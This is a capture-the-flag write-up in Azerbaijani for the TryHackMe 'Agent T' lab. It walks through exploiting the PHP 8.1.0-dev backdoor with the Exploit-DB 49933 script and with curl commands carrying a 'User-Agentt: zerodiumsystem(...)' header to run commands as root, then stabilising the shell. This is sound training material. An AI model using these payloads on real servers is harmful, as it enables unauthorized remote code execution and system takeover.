# TryHackMe — Agent T Writeup (Azərbaycanca)

---

## 📋 Otaq Haqqında

**Çətinlik:** Easy  
**Mövzu:** PHP 8.1.0-dev backdoor, RCE  
**Ssenariy:** Veb server bir az qəribə cavab verir...
Nəyinsə səhv olduğunu hiss edirsən?

---

## 1. 🔍 Kəşfiyyat (Nmap)

```bash
nmap -sV -sC 10.80.181.215
```

**Nəticə:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

> ⚠️ **Mühüm:** `PHP 8.1.0-dev` — bu **development** versiyasıdır!
> Production serverdə development versiyası işləyir — çox təhlükəli!

---

## 2. 🌐 Veb Sayta Bax

```
http://10.80.181.215
```

**Admin Dashboard** səhifəsi görünür. Səthən heç nə yoxdur.

**Burp Suite** ilə HTTP response header-larına bax:
```
X-Powered-By: PHP/8.1.0-dev
```

Bu header bizə PHP versiyasını göstərir!

---

## 3. 🔎 Vulnerability Araşdırması

PHP 8.1.0-dev versiyasında məşhur **backdoor** mövcuddur!

**CVE:** Exploit-DB #49933  
**Səbəb:** 2021-ci ildə kimsə PHP-nin GitHub repo-suna backdoor əlavə etdi.  
**Necə işləyir:** `User-Agentt` header-ı (iki `t` ilə!) vasitəsilə sistem komandaları icra etmək mümkündür.

```bash
searchsploit php 8.1.0-dev
# php/webapps/49933.py tapılır
```

---

## 4. ⚡ Exploit

### Metod 1 — Avtomatik Exploit Script:

```bash
searchsploit -m php/webapps/49933.py
python3 49933.py
# Enter the full host url: http://10.80.181.215
```

İnteraktiv shell açılır:
```bash
$ whoami
root
```

### Metod 2 — Əl ilə curl:

```bash
# Diqqət: User-Agentt — İKİ T ilə!
curl -s http://10.80.181.215 -H "User-Agentt: zerodiumsystem('id');"
curl -s http://10.80.181.215 -H "User-Agentt: zerodiumsystem('whoami');"
curl -s http://10.80.181.215 -H "User-Agentt: zerodiumsystem('cat /flag.txt');"
```

---

## 5. 🐚 Shell Stabilizasiyası

Shell aldıqdan sonra:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 6. 🚩 Flag

```bash
find / -name "flag.txt" 2>/dev/null
cat /flag.txt
```

🚩 **Flag:** `flag{...}`

---

## 7. 🗺️ Attack Chain

```
Nmap skanı
    ↓
PHP 8.1.0-dev aşkar edildi
    ↓
Exploit-DB #49933 — User-Agentt backdoor
    ↓
python3 49933.py → interaktiv shell
    ↓
whoami → root 👑
    ↓
cat /flag.txt → FLAG 🚩
```

---

## 8. 📝 Əsas Öyrənilənlər

| Konsept | İzah |
|---------|------|
| **PHP 8.1.0-dev** | Development versiyası — backdoor var |
| **User-Agentt** | İki `t` ilə — backdoor trigger |
| **X-Powered-By** | Header vasitəsilə versiya aşkar edildi |
| **RCE** | Remote Code Execution — uzaqdan kod icra |
| **Exploit-DB #49933** | Bu backdoor üçün hazır exploit |

---

## 9. ⚠️ Mühüm Qeydlər

> `User-Agentt` — **mütləq iki `t`** ilə yazılmalıdır!
> `User-Agent` (bir t) işləməyəcək!

> PHP 8.1.0-dev backdoor-u 2021-ci ildə supply chain attack
> nəticəsində PHP-nin rəsmi GitHub repo-suna əlavə edilmişdi.
> Bu, real dünyada baş vermiş hadisədir!

---

*Hazırladı: CTF Player | TryHackMe — Agent T*
